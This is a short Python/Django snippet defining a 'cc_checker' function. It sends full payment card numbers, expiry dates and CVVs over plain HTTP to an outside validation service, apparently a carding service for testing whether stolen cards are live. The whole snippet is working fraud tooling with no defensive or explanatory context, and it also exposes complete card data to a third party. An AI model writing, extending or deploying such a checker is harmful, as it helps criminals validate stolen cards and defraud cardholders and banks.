import requests
from django.conf import settings

def cc_checker(card_number, month, year, cvv):
    cc_data = f"{card_number}|{month}|{year}|{cvv}"
    res = requests.get("http://api.validccs.pro/", params={"key": settings.CC_CHECKER_KEY, "cc": cc_data})
    if res.status_code in [200, 201]:
        return res.json()
    return None
